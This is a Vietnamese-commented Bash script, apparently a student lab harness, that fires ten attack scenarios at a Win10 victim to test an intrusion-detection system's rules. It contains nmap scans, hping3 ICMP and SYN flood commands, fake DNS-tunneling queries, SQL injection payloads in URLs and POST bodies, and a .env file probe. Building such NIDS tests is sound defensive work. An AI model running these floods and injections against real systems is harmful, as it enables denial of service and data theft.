#!/bin/bash
#
# KỊCH BẢN THỰC NGHIỆM TẤN CÔNG NIDS — Chạy trên Kali Linux
#
# Cấu hình mạng:
#   Host (NIDS)  : 192.168.122.1
#   Kali (Attacker): 192.168.122.230
#   Win10 (Victim) : 192.168.122.54
#
# Yêu cầu trước khi chạy:
#   - Trên Host: khởi động NIDS với CHUỖI 2 file rules:
#       sudo .venv/bin/python main.py --iface <iface> \
#            --rules custom.rules --rules custom_test.rules --limit 0
#     HOẶC gộp 2 file rules lại thành 1 rồi nạp.
#   - Trên Win10 Victim: mở dịch vụ HTTP trên cổng 80
#       python -m http.server 80   (hoặc Apache/IIS)
#
# Cần quyền root (sudo) để chạy nmap và hping3.
# =========================================================================

TARGET_IP="192.168.122.54"    # Win10 Victim
NIDS_IP="192.168.122.1"      # Host chạy NIDS

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

separator() {
    echo ""
    echo -e "${CYAN}===========================================================${NC}"
}

wait_between() {
    echo -e "${YELLOW}>> Đợi 5 giây trước kịch bản tiếp theo...${NC}"
    sleep 5
}

# =========================================================================
# Kịch bản 1: Quét cổng bằng Nmap (Port Scan Detection)
# Luật: RULE-001 — ≥20 cổng TCP khác nhau trong 10 giây
# =========================================================================
scenario_1() {
    separator
    echo -e "${RED}[KB 1] Quét cổng bằng Nmap (Port Scan Detection)${NC}"
    echo "  Luật kích hoạt: RULE-001 (≥20 unique TCP ports / 10s)"
    echo "  Gửi SYN scan đến 20 cổng với tốc độ nhanh (T4, --scan-delay 5ms)"
    echo "---"
    sudo nmap -sS \
        -p 21,22,23,25,53,80,110,135,139,143,443,445,1433,3306,3389,8080,8443,8888,9090,9200 \
        --scan-delay 5ms -T4 -n --open --max-retries 0 \
        "$TARGET_IP"
    echo -e "${GREEN}>> Kịch bản 1 hoàn tất.${NC}"
}

# =========================================================================
# Kịch bản 2: ICMP Ping Flood DoS Attack
# Luật: RULE-002 — ≥100 gói ICMP request (type 8/13/17) trong 10 giây
# =========================================================================
scenario_2() {
    separator
    echo -e "${RED}[KB 2] ICMP Ping Flood DoS Attack${NC}"
    echo "  Luật kích hoạt: RULE-002 (≥100 ICMP request / 10s)"
    echo "  Gửi 120 gói ICMP Echo Request, khoảng cách 50ms (u50000)"
    echo "---"
    sudo hping3 --icmp -c 120 -i u50000 "$TARGET_IP"
    echo -e "${GREEN}>> Kịch bản 2 hoàn tất.${NC}"
}

# =========================================================================
# Kịch bản 3: TCP SYN Flood Attack
# Luật: RULE-003 — ≥100 gói SYN (không ACK) cùng src:dst:port trong 10s
# =========================================================================
scenario_3() {
    separator
    echo -e "${RED}[KB 3] TCP SYN Flood Attack${NC}"
    echo "  Luật kích hoạt: RULE-003 (≥100 SYN packets / 10s → port 80)"
    echo "  Gửi 120 gói TCP SYN đến cổng 80, khoảng cách 50ms (u50000)"
    echo "---"
    sudo hping3 -S -p 80 -c 120 -i u50000 "$TARGET_IP"
    echo -e "${GREEN}>> Kịch bản 3 hoàn tất.${NC}"
}

# =========================================================================
# Kịch bản 4: DNS Tunneling Anomaly Detection
# Luật: RULE-004 — ≥5 DNS queries bất thường trong 30 giây
#   Điều kiện bất thường (cần đạt ≥1 trong 3):
#     - Tổng độ dài query name ≥ 100 ký tự
#     - Nhãn phụ (label) dài nhất ≥ 45 ký tự
#     - Entropy Shannon của label ≥ 3.8 (với label ≥ 24 ký tự)
#
#   → Dùng chuỗi base64 dài ≥52 ký tự cho mỗi nhãn để vượt ngưỡng.
# =========================================================================
scenario_4() {
    separator
    echo -e "${RED}[KB 4] DNS Tunneling Anomaly Detection${NC}"
    echo "  Luật kích hoạt: RULE-004 (≥5 suspicious DNS queries / 30s)"
    echo "  Gửi 7 truy vấn DNS với nhãn phụ dài (≤63 chars), entropy cao"
    echo "---"
    # Label phải ≤63 ký tự (giới hạn giao thức DNS), nhưng ≥45 ký tự (ngưỡng NIDS)
    # Các label 54-56 ký tự đã kiểm chứng hoạt động trong kali_attack_demo.sh
    # Gửi qua @8.8.8.8 để traffic đi qua virbr0 (interface NIDS đang sniff)
    local labels=(
        "aGVsbG93b3JsZGhlbGxvd29ybGRoZWxsb3dvcmxkaGVsbG93b3JsZA"
        "dGhpcWlzYXZlcnlsb25nc3ViZG9tYWlubGFiZWxmb3J0ZXN0aW5n"
        "c3VzcGljaW91c2Ruc3F1ZXJ5Zm9ybmlkc2RlbW9wcm9qZWN0dGVzdA"
        "ZGF0YWV4ZmlsdHJhdGlvbnZpYWRuc3R1bm5lbGluZ2RlbW90ZXN0cQ"
        "bmlkc3Byb2plY3RkZW1vYXR0YWNrc2ltdWxhdGlvbnRlc3RsYWJlbA"
        "c2VtZXN0ZXJwcm9qZWN0aW50cnVzaW9uZGV0ZWN0aW9uc3lzdGVtdA"
        "aW50cnVzaW9uZGV0ZWN0aW9uc3lzdGVtZGVtb3Rlc3RsYWJlbHNnbg"
    )
    for label in "${labels[@]}"; do
        echo "  >> dig ${label:0:30}...tunnel.example.com"
        dig +short +time=1 +tries=1 "${label}.tunnel.example.com" @8.8.8.8 2>/dev/null
        sleep 0.4
    done
    echo -e "${GREEN}>> Kịch bản 4 hoàn tất.${NC}"
}

# =========================================================================
# Kịch bản 5: Luật chữ ký DNS tùy chỉnh (Custom DNS Signature Matching)
# Luật: SID 1000101 — dns.query chứa "example.com"
# Lưu ý: Luật nằm trong file custom_test.rules
# =========================================================================
scenario_5() {
    separator
    echo -e "${RED}[KB 5] Custom DNS Signature Matching${NC}"
    echo "  Luật kích hoạt: SID 1000101 (dns.query chứa 'example.com')"
    echo "---"
    # Gửi qua @8.8.8.8 để traffic đi qua virbr0 (interface NIDS sniff)
    dig example.com @8.8.8.8
    echo -e "${GREEN}>> Kịch bản 5 hoàn tất.${NC}"
}

# =========================================================================
# Kịch bản 6: sqlmap User-Agent Scan
# Luật: SID 1000002 — http.user_agent chứa "sqlmap"
# =========================================================================
scenario_6() {
    separator
    echo -e "${RED}[KB 6] sqlmap Scanner User-Agent Detected${NC}"
    echo "  Luật kích hoạt: SID 1000002 (http.user_agent chứa 'sqlmap')"
    echo "---"
    curl -v -A "sqlmap/1.8.2#stable (https://sqlmap.org)" \
        "http://$TARGET_IP/" 2>&1 | head -20
    echo ""
    echo -e "${GREEN}>> Kịch bản 6 hoàn tất.${NC}"
}

# =========================================================================
# Kịch bản 7: SQL Injection GET URI
# Luật: SID 1000001 — http.uri chứa "' OR '1'='1"
# NIDS tự động URL-decode trước khi so khớp.
# =========================================================================
scenario_7() {
    separator
    echo -e "${RED}[KB 7] SQL Injection trong URL Parameters (GET)${NC}"
    echo "  Luật kích hoạt: SID 1000001 (http.uri chứa SQL injection pattern)"
    echo "---"
    curl -v "http://$TARGET_IP/index.php?id=%27%20OR%20%271%27%3D%271" 2>&1 | head -20
    echo ""
    echo -e "${GREEN}>> Kịch bản 7 hoàn tất.${NC}"
}

# =========================================================================
# Kịch bản 8: SQL Injection POST Body
# Luật: SID 1000003 — pkt_data (payload) chứa "' OR '1'='1"
# =========================================================================
scenario_8() {
    separator
    echo -e "${RED}[KB 8] SQL Injection trong POST Request Body${NC}"
    echo "  Luật kích hoạt: SID 1000003 (pkt_data chứa SQL injection pattern)"
    echo "---"
    curl -v -X POST "http://$TARGET_IP/login" \
        --data "username=admin&password=' OR '1'='1" 2>&1 | head -20
    echo ""
    echo -e "${GREEN}>> Kịch bản 8 hoàn tất.${NC}"
}

# =========================================================================
# Kịch bản 9: Brute Force Detection (Repeated Web Access)
# Luật: SID 900004 — detection_filter: ≥5 lần khớp "GET" từ cùng IP / 10s
# Gửi 10 yêu cầu GET liên tục để chắc chắn vượt ngưỡng.
# =========================================================================
scenario_9() {
    separator
    echo -e "${RED}[KB 9] Brute Force Detection (Repeated Web Access)${NC}"
    echo "  Luật kích hoạt: SID 900004 (detection_filter: ≥5 GET / 10s)"
    echo "  Gửi 10 yêu cầu GET liên tục..."
    echo "---"
    for i in $(seq 1 10); do
        echo "  >> Request #$i"
        curl -s "http://$TARGET_IP/" -o /dev/null -w "    HTTP %{http_code}\n"
        sleep 0.3
    done
    echo -e "${GREEN}>> Kịch bản 9 hoàn tất.${NC}"
}

# =========================================================================
# Kịch bản 10: .env Configuration File Access
# Luật: SID 1000005 — http.uri chứa ".env"
# =========================================================================
scenario_10() {
    separator
    echo -e "${RED}[KB 10] Khai thác cấu hình nhạy cảm (.env File Access)${NC}"
    echo "  Luật kích hoạt: SID 1000005 (http.uri chứa '.env')"
    echo "---"
    curl -v "http://$TARGET_IP/.env" 2>&1 | head -20
    echo ""
    echo -e "${GREEN}>> Kịch bản 10 hoàn tất.${NC}"
}

# =========================================================================
# MENU
# =========================================================================
show_menu() {
    echo ""
    echo -e "${CYAN}===========================================================${NC}"
    echo -e "${CYAN}    KỊCH BẢN THỰC NGHIỆM TẤN CÔNG NIDS (KALI LINUX)      ${NC}"
    echo -e "${CYAN}===========================================================${NC}"
    echo -e "  Host (NIDS)   : ${GREEN}$NIDS_IP${NC}"
    echo -e "  Kali (Attacker): ${RED}192.168.122.230${NC}"
    echo -e "  Victim (Win10) : ${RED}$TARGET_IP${NC}"
    echo -e "${CYAN}-----------------------------------------------------------${NC}"
    echo ""
    echo "  --- Nhóm 1: Phát hiện dựa trên Hành vi (Behavior) ---"
    echo "  [1] Quét cổng Nmap (RULE-001 Port Scan)"
    echo "  [2] ICMP Ping Flood (RULE-002)"
    echo "  [3] TCP SYN Flood  (RULE-003)"
    echo "  [4] DNS Tunneling  (RULE-004)"
    echo ""
    echo "  --- Nhóm 2: Phát hiện dựa trên Chữ ký (Signature) ---"
    echo "  [5] Custom DNS Signature   (SID 1000101)"
    echo "  [6] sqlmap User-Agent Scan (SID 1000002)"
    echo "  [7] SQL Injection GET URI  (SID 1000001)"
    echo "  [8] SQL Injection POST Body(SID 1000003)"
    echo "  [9] Brute Force Detection  (SID 900004)"
    echo "  [10] .env File Access      (SID 1000005)"
    echo ""
    echo -e "  ${YELLOW}[A] Chạy tất cả 10 kịch bản tuần tự${NC}"
    echo "  [0] Thoát"
    echo ""
}

show_menu
read -p "Chọn kịch bản (0-10, A): " choice

if [[ "$choice" == "A" || "$choice" == "a" ]]; then
    echo ""
    echo -e "${YELLOW}>> Bắt đầu chạy tuần tự 10 kịch bản...${NC}"
    for i in $(seq 1 10); do
        "scenario_$i"
        if [ "$i" -lt 10 ]; then
            wait_between
        fi
    done
    separator
    echo -e "${GREEN}>> ĐÃ HOÀN TẤT TẤT CẢ 10 KỊCH BẢN.${NC}"
    echo -e "${YELLOW}>> Kiểm tra cảnh báo tại: http://$NIDS_IP:5000${NC}"
elif [[ "$choice" =~ ^[0-9]+$ && "$choice" -ge 1 && "$choice" -le 10 ]]; then
    "scenario_$choice"
    separator
    echo -e "${YELLOW}>> Kiểm tra cảnh báo tại: http://$NIDS_IP:5000${NC}"
elif [[ "$choice" == "0" ]]; then
    echo "Đã thoát."
    exit 0
else
    echo -e "${RED}Lựa chọn không hợp lệ!${NC}"
    exit 1
fi
